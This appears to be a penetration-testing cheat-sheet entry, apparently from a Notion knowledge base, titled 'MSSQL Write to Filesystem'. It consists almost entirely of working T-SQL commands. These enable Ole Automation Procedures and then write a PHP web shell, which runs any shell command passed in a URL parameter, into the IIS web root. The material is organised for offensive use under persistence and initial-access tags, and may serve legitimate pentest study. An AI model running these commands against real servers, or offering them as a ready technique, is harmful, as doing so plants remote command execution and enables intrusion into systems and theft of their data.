# MSSQL Write to Filesystem

OS: Windows
Description: MSSQL Write to filesystem
Security Domains: Persistence (https://www.notion.so/Persistence-1434c8e523768074b5d4daa95c78dbbb?pvs=21), Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21)
Target_Technology: mssql (https://www.notion.so/mssql-1444c8e5237680f9abcfdf35bc047c00?pvs=21)

### MSSQL Write to Filesystem

```jsx
MSSQL - Enable Ole Automation Procedures
  Attacking SQL Databases
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
MSSQL - Create a File
  Attacking SQL Databases
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```